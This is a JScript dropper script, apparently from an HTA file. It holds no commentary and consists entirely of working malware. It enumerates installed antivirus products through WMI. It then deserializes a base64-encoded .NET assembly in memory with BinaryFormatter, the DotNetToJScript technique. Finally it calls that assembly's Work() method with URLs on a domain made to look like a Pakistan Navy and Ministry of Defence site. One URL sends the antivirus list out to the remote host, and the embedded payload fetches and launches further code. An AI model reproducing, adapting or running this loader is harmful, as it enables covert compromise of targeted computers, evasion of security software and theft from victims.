try {
    var __ActiveXObject = ActiveXObject;

    function base64ToStream(b) {
        var enc = new __ActiveXObject("System.Text.ASCIIEncoding");
        var length = enc["GetByteCount_2"](b);
        var ba = enc["GetBytes_4"](b);
        var transform = new __ActiveXObject("System.Security.Cryptography.FromBase64Transform");
        ba = transform["TransformFinalBlock"](ba, 0, length);
        var ms = new __ActiveXObject("System.IO.MemoryStream");
        ms.Write(ba, 0, (length / 4) * 3);
        ms.Position = 0;
        return ms;
    }


    var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkDAAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAHdGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAACQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYRAAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAAAAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5YbWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkGFwAAAARMb2FkCg8MAAAAACIAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dyYW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAm1QcxwAAAAAAAAAA4AAiIAsBMAAAGgAAAAYAAAAAAADOOQAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQAAAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAADAAAAAAAAAAAAAAAgDkAAEsAAAAAQAAAjAIAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAAAAAALnRleHQAAADUGQAAACAAAAAaAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAjAIAAABAAAAABAAAABwAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAgAAAAAAAAAAAAAAAAAABAAABCAAAAAAAAAAAAAAAAAAAAALA5AAAAAAAASAAAAAIABQAMJQAAchQAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHgIoIgAACioq/gkAAG8jAAAKKkr+CQAA/gkBAP4JAgBvJAAACio6/gkAAP4JAQBvJQAACipa/gkAAP4JAQD+CQIA/gkDAG8mAAAKKlr+CQAA/gkBAP4JAgD+CQMAbycAAAoqWv4JAAD+CQEA/gkCAP4JAwBvKAAACioq/gkAAG8pAAAKKjr+CQAA/gkBAG8qAAAKKir+CQAAKCsAAAoqUgIDKBMAAAZ1JgAAASUZKBQAAAYqHgIoLAAACio6/gkAAP4JAQAoLQAACio6/gkAAP4JAQBvLgAACioAABswBACbAAAAAQAAEXIBAABwcwUAAAoKBnIvAABwcwYAAApzBwAACnMIAAAKC3MHAAAKDHJLAABwcwYAAAoNBgkIcwgAAAooBgAABhMEEQRydQAAcBeMEgAAASgHAAAGB3KLAABwKAgAAAYTBREFcpkAAHACKAkAAAYRBXKxAABwEQQoCgAABgdyiwAAcBEFcwkAAAooCwAABibeCgcsBgdvCgAACtwqAAEQAAACACEAb5AACgAAAAAbMAQAaAAAAAIAABECcwsAAAoKBhZzDAAACgtzDQAACgwgAAQAAI0YAAABDSsKCAkWEQQoDAAABgcJFgmOaSgNAAAGJRMEFjDlCCgOAAAGEwXeHggsBghvCgAACtwHLAYHbwoAAArcBiwGBm8KAAAK3BEFKgEoAAACABUAMkcACgAAAAACAA8AQlEACgAAAAACAAcAVFsACgAAAAAbMAIANgAAAAMAABFzEgAABgoWCwAGAigPAAAGDN4hJgcXWAsHGTMC/hogiBMAACgQAAAG3t4GLAYGbwoAAArcCCoAAAEcAAAAAAkAChMAFwEAAAECAAYAJCoACgAAAAAbMAYAxgEAAAQAABEWChYLFgwEcuUAAHAWG28OAAAKFS4EFworJgRy8wAAcBYbbw4AAAoVLgQXCysSBHL/AABwFhtvDgAAChUuAhcMAAQoAwAABibeAybeAA4EKA8AAAo6iQAAAHIHAQBwDgRyFwEAcHIbAQBwbxAAAAooEQAACigSAAAKDQkFKBMAAAooAgAABigUAAAKBgdgCGAsJnIfAQBwCXLKAQBwcs4BAHBvEAAACnLUAQBwKBUAAAooAQAABisHCSgWAAAKJt4hEwQEchICAHARBG8XAAAKKBUAAAooAwAABibeAybeAN4AAAMoAwAABhMFEQWOaR8gWY0YAAABEwYWEwcrHREGEQcRBREHHyBYkREFEQcfIF2RYdKcEQcXWBMHEQcRBo5pMtsRBigYAAAKbxkAAAoTCBYTCStZEQgRCZoTChEKbxoAAAoCKBsAAApvGgAACm8cAAAKLDMXjQEAAAElFgSiEwsRChELKB0AAAom3ikmBHIaAgBwbx4AAAosC3I0AgBwcx8AAAp63g4RCRdYEwkRCREIjmkyn94sEwwEchICAHARDG8XAAAKKBUAAAooAwAABibeAybeAN4LKCAAAApvIQAACtwqAAABWAAAAABBAAlKAAMBAAABAADDABrdAAMBAAABAABZAGjBACEZAAABAABiAQxuARskAAABAACbARq1AQMBAAABAADjALaZASEZAAABAgDjANe6AQsAAAAAQlNKQgEAAQAAAAAADAAAAHYyLjAuNTA3MjcAAAAACwDYAAAA9AQAACN+AADMBQAAVAoAACNTdHJpbmdzAAAAACAQAAA4AgAAI1VTAFgSAAAQAAAAI0dVSUQAAABoEgAAxAEAACNCbG9iAAAALBQAAAoAAAAjVVMxIAAAADgUAAAKAAAAI1N0aW5ncyAAAAAARBQAAAoAAAAjc1N0cmltZ3MAAABQFAAACgAAACNER1UxRAAAXBQAAAoAAAAjVVMgIAAAAGgUAAAKAAAAI3RyaW5ncyAAAAAAAAAAAAIAQAFHFQIACQIAAAD6JTMAFgAAAQAAACYAAAADAAAAFAAAACgAAAAuAAAABAAAAAQAAAABAAAAAwAAAAEAAAAhQ2WHAAD3BAEAAAAAAAYAVwleBQoATQlzCQoAJAlzCQoAwghzCQ4AaQleCQ4AsQleCQ4AzAReBQ4AFQheCQYAUARJCAYAcARJCAYAKAQCCC8AaQgAAAYAPAQqCAoANgJzCQoA+whzCQoA1ghzCQoAvQRzCQYAAQBeBQYAAAJeBQYALQUHAA4AIgXaBQYAMwUHAA4AqAHaBQYAjgReBQYATQZeBQYASQJeBQYAtgReBQYAVwZeBQYAhQleBQYAlwleBQYAKAIHAA4AFQkCCAYAIAorBgYAaAYrBgYA8gdeBQYAPQYrBgYAtQCbBA4AnwleCQAAAAChBQAAAAABAAEAAQAQAE0FAAAFAAEAAQADABAAvAcAABUAAQARACwhAAAAAJEASQcKAAEA5CEAAAAAkQDVBA8AAgCAIgAAAACRAD8DFgADAOAiAAAAAIYA0AQcAAQAUCAAAAAAhhj8ByQACABYIAAAAACWAJIDMQAIAGMgAAAAAJYA8AA3AAkAdiAAAAAAlgCcAj4ADABjIAAAAACWAPQCNwAOAGMgAAAAAJYAzAI3ABEAhSAAAAAAlgAVA0UAFACcIAAAAACWAB4AUAAYALMgAAAAAJYAawdZABwAyiAAAAAAlgC8CWIAIADVIAAAAACWADMBaAAhAOQgAAAAAJYAcwBvACMA7yAAAAAAxADBAHQAJAAEIQAAAACGGPwHJAAlAAwhAAAAAJYAYAJ7ACUAGyEAAAAAlgAqB4MAJwAAAAEADAIAAAEAZQUAAAEABAUAAAEAhQUAAAIAjQEAAAMAygMAAAQAeAMAAAAAXQMAAAAACwYAAAEAnQAAAAIA3QkAAAAAxgUAAAEAOgUAAAAA1QYAAAEAywEAAAIAqQYAAAAAjAYAAAEAEQcAAAIAtAMAAAAAvwYAAAEA8gMAAAIAjAcAAAMACQoAAAAAGAEAAAEAOQkAAAIApAcAAAMA+QYAAAAA6AYAAAEA4gcAAAIANwoAAAMAhwIAAAAAuAEAAAAAcwEAAAEA7QEAAAAACwQAAAEAQgAAAAAATgIAAAEA7gkAAAAAcwYAAAEAXwBJAPwHigBRAPwHJABZAPwHtwBpAPwHxgBxAPwH4ACJAPwH4ACBAPwHJAB5APwH5QAhAPwHJACZADcDJAChAPwH/QCpAPwHAwGhAPwHJADZAJMEKwHZACkKMwHZAFwBOAHZAB0JPgHpAHgIRAHxAKwEFgD5AKQISQHZAB0JUAEBAZEJVwHJAOEBXgEJAbwAYgEJAZMIagERAS0CXgEJAEYCcAHZALIIdQEZAWQBegHZALkIdQHJAPwH4AABAQsJggEBAf8EJAAJAPwHJAB5AGQBiAEZAFUFjQERAOcIkwERAOMAmQGxAOwDowGxALAAqwGhAAEKswEpABEAuAEpAZ8GbwApAPwHJAApAK4JdAAxAfAFvgEuAAsAjwAuABMAmAAuABsAvQBDACMAywDRAO8ACwETAQSAAAAAAAAAAAAAAAAAAAAAAKUGAAACAAAAAAAAAAAAAAABAJQAAAAAAAIAAAAAAAAAAAAAACgAcwkAAAAAAgAAAAAAAAAAAAAAAQBeBQAAAAADAAIAAAAASW50MzIAU3lzdGVtLklPAERvd25sb2FkRGF0YQBDaGFpbkludGVycHJldGVyU2luZ2xlU3RydWN0dXJlRGF0YQBJbnN0YW5jZUZseXdlaWdodFByaXZhdGVEYXRhAE9ic2VydmVyUHJvZ3JhbURhdGEAQ2xhc3NTdHJhdGVneVRlbXBsYXRlUmVxdWVzdERhdGEAbXNjb3JsaWIAQ2xhc3NPYmplY3REeW5hbWljAFJlYWQAVGhyZWFkAExvYWQAQ29tbWFuZENvbXBvc2l0ZUNvbW1hbmRSZXN0cmljdGVkAEludm9rZU1ldGhvZABTaGFyZUFsZ29yaXRobVN0cnVjdHVyZVByaXZhdGVJbnRlcmZhY2UASW5zdGFuY2VDb21wb3NpdGVJbnRlcmZhY2UAU2hhcmVSZXF1ZXN0SW50ZXJwcmV0ZXJTdHJhdGVneUludGVyZmFjZQBSZXBsYWNlAENyZWF0ZUluc3RhbmNlAEZseXdlaWdodFRlbXBsYXRlSW5zdGFuY2UAR2V0Tm90aWZ5Rmx5d2VpZ2h0SW5zdGFuY2UAQ29tcHJlc3Npb25Nb2RlAE11dGF0b3JDYXB0dXJlVHJlZQBNZWRpYXRvckZseXdlaWdodFRyZWUAZ2V0X01lc3NhZ2UAQ2xhc3NQcml2YXRlQnJpZGdlAElEaXNwb3NhYmxlAEFkYXB0ZXJDb21wb3NpdGVTaGFyZVNpbmdsZQBGaWxlAGdldF9OYW1lAE1hbmFnZW1lbnRTY29wZQBHZXRUeXBlAEJyaWRnZU9iamVjdFNoYXJlAE51bGxJbnN0YW5jZUNvbXBvc2l0ZVJlc3RyaWN0ZWRSZXN0b3JlAENvbXBvc2l0ZU51bGxSZXN0b3JlAER5bmFtaWNJbXBsZW1lbnRhdGlvblJlcXVlc3RTZXF1ZW50aWFsU3RydWN0dXJlAE9ic2VydmVyVGVtcGxhdGVBbGdvcml0aG1BbHRlclN0cnVjdHVyZQBPYnNlcnZlckRlZmVyQ29tbWFuZEdldFN0cnVjdHVyZQBTdGF0ZUludGVyZmFjZVByb2dyYW1DaGFpbkNhcHR1cmUARGlzcG9zZQBSZXN0b3JlQ29tbWFuZENvbW1hbmRUZW1wbGF0ZQBTdHJ1Y3R1cmVDb21wb3NpdGVUZW1wbGF0ZQBNZWRpYXRvclNpbmdsZUJyaWRnZVN0YXRlAEFjY2Vzc29yTnVsbENvbW1hbmRQcml2YXRlUHJpdmF0ZQBGYWNhZGVNZWRpYXRvclByaXZhdGUASW50ZXJwcmV0ZXJNdXRhdG9yTWVkaWF0b3JQcml2YXRlAFdyaXRlAEFjY2Vzc29yUHJpdmF0ZUNvbXBvc2l0ZQBJbnRlcnByZXRlck9ic2VydmVyQ29tcG9zaXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAEJ5dGUASW5kZXhPZgBTeXN0ZW0uVGhyZWFkaW5nAEZyb21CYXNlNjRTdHJpbmcATWFuYWdlbWVudFBhdGgAVXJpAFdvcmsAUHJvZ3JhbUZseXdlaWdodER5bmFtaWNTZXF1ZW50aWFsAEFwcC5kbGwAS2lsbABDb21wb3NpdGVPYnNlcnZlckFjY2Vzc29yTnVsbABHWmlwU3RyZWFtAE1lbW9yeVN0cmVhbQBJbXBsZW1lbnRhdGlvblByb3h5UHJvZ3JhbQBzZXRfSXRlbQBTeXN0ZW0ASW5zdGFuY2VDb21tYW5kUmVzdG9yZUFsZ29yaXRobQBBY2Nlc3NvclB1dENhcHR1cmVBbGdvcml0aG0AU2hhcmVTaGFyZUludGVyZmFjZVRlbXBsYXRlQWxnb3JpdGhtAFByb2dyYW1SZXN0b3JlQ2hhaW4AU3lzdGVtLklPLkNvbXByZXNzaW9uAHNldF9BdXRvbWF0aWNEZWNvbXByZXNzaW9uAFN0cnVjdHVyZVN0cmF0ZWd5SW1wbGVtZW50YXRpb24AU3lzdGVtLlJlZmxlY3Rpb24AVGFyZ2V0SW52b2NhdGlvbkV4Y2VwdGlvbgBTdHJpbmdDb21wYXJpc29uAE1lbWJlckluZm8ASXRlcmF0b3JTdHJ1Y3R1cmVNZW1lbnRvAE51bGxNdXRhdG9yTWVtZW50bwBTbGVlcABBcHAARW5jYXBzdWxhdGVkVHJlZURlZmVyAENvbXBvc2l0ZVByaXZhdGVEZWZlcgBQcml2YXRlT2JqZWN0RGVmZXIATm90aWZ5UHJveHlEZWZlcgBOdWxsTWVkaWF0b3JJbnRlcnByZXRlcgBSZXN0b3JlQWxnb3JpdGhtT2JzZXJ2ZXIAUmVxdWVzdERhdGFNZW1lbnRvVHJlZUFjY2Vzc29yAEluc3RhbmNlSXRlcmF0b3JBbGdvcml0aG1NZWRpYXRvcgBBZGFwdGVyU2hhcmVDb21wb3NpdGVHZXRNZWRpYXRvcgBEeW5hbWljQWNjZXNzb3JJdGVyYXRvcgBTdHJhdGVneVNpbmdsZURlY29yYXRvcgBEZWNvcmF0b3JQcm9ncmFtTXV0YXRvclNoYXJlRGVjb3JhdG9yAEdldEFsdGVyTXV0YXRvcgBBY3RpdmF0b3IALmN0b3IAU3lzdGVtLkRpYWdub3N0aWNzAERlY29tcHJlc3Npb25NZXRob2RzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAEV4cGFuZEVudmlyb25tZW50VmFyaWFibGVzAEdldEV4cG9ydGVkVHlwZXMAV3JpdGVBbGxCeXRlcwBFcXVhbHMAQ29udGFpbnMASW52b2tlTWV0aG9kT3B0aW9ucwBPYmplY3RHZXRPcHRpb25zAEdldE1ldGhvZFBhcmFtZXRlcnMATWFuYWdlbWVudENsYXNzAEdldEN1cnJlbnRQcm9jZXNzAENvbmNhdABNYW5hZ2VtZW50QmFzZU9iamVjdABOb3RpZnlQcml2YXRlT2JqZWN0AE1hbmFnZW1lbnRPYmplY3QAU3lzdGVtLk5ldABXZWJDbGllbnQAU3lzdGVtLk1hbmFnZW1lbnQARW52aXJvbm1lbnQAU3RhcnQAQ29udmVydABIdHRwV2ViUmVxdWVzdABHZXRXZWJSZXF1ZXN0AFByb3h5Q2FwdHVyZUR5bmFtaWNTaW5nbGVSZXF1ZXN0AENsYXNzTnVsbFJlcXVlc3QAUmVxdWVzdFN0cmF0ZWd5UHV0AFRvQXJyYXkATWVtZW50b0FsZ29yaXRobU5vdGlmeQBBc3NlbWJseQBJc051bGxPckVtcHR5AEZseXdlaWdodEVuY2Fwc3VsYXRlZFByb3h5AAAAAC1cAFwAbABvAGMAYQBsAGgAbwBzAHQAXAByAG8AbwB0AFwAQwBJAE0AVgAy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"
    var entry_class = "Program";

    try {
        function determine_verison() {
            var FSO = new __ActiveXObject("Scripting.FileSystemObject");
            var folds = FSO.GetFolder(FSO.GetSpecialFolder(0) + "\\Microsoft.NET\\Framework\\").SubFolders;
            e = new Enumerator(folds);
            var folder;
            e.moveFirst();
            while (e.atEnd() == false) {
                folder = e.item();
                var files = folder.files;
                var fileEnum = new Enumerator(files);
                fileEnum.moveFirst();
                do {
                    if (fileEnum.item() == null)
                        continue;
                    if (fileEnum.item().Name == "csc.exe") {
                        if (folder.Name.substring(0, 2) == "v2")
                            return "v2.0.50727";
                        else if (folder.Name.substring(0, 2) == "v4")
                            return "v4.0.30319";
                    }
                    fileEnum["moveNext"]();
                } while (fileEnum.atEnd() == false);
                e["moveNext"]();
            }
            return folder.Name;
        }

        var shell = new __ActiveXObject("WScript.Shell");
        var ver = "v2.0.50727";
        try {
            ver = determine_verison();
        } catch (e) {
            ver = "v2.0.50727";
        }
        shell.Environment("Process")("COMPLUS_Version") = ver;
        var objWMI1Service = GetObject("winmgmts:\\\\.\\root\\SecurityCenter2");
        var colItems = objWMI1Service.ExecQuery("Select displayName, productState From AntiVirusProduct", null, 48);
        var objItem = new Enumerator(colItems);

        var av_products_on_host = "";
        for (; !objItem.atEnd(); objItem["moveNext"]()) {
            av_products_on_host += (objItem.item()["displayName"] + " " + objItem.item().productState).replace(" ", "");
        }
        var stm = base64ToStream(serialized_obj.split(".").join(''));
        var fmt = new __ActiveXObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter");
        var al = new __ActiveXObject("System.Collections.ArrayList");
        var d = fmt["Deserialize_2"](stm);

        al["Add"](undefined);
        var o = d["DynamicInvoke"](al["ToArray"]())["CreateInstance"](entry_class);
        if (av_products_on_host && av_products_on_host.length) {
            av_products_on_host = av_products_on_host + "_stg1";
        }
        var aUrl = "https://dgmp-paknavy.mod-pk.com/14325/1/10/3/3/0/1865884360/uAiXa3upVnbI8GnagA2EgfGUnQxzUvVIEq4r3YTr/files-984c52a9/0/data?d=" + av_products_on_host;
        o["Work"]("https://dgmp-paknavy.mod-pk.com/14325/1/10/3/1/1/1865884360/uAiXa3upVnbI8GnagA2EgfGUnQxzUvVIEq4r3YTr/files-f3046d06/1/");
        window.close();
    } catch (e) {
        o["Work"]("https://dgmp-paknavy.mod-pk.com/14325/1/10/3/1/1/1865884360/uAiXa3upVnbI8GnagA2EgfGUnQxzUvVIEq4r3YTr/files-f3046d06/1/", aUrl, "", "");
        window.close();
    } finally {
    }

} catch (e) {
} finally {
    window.close();
}


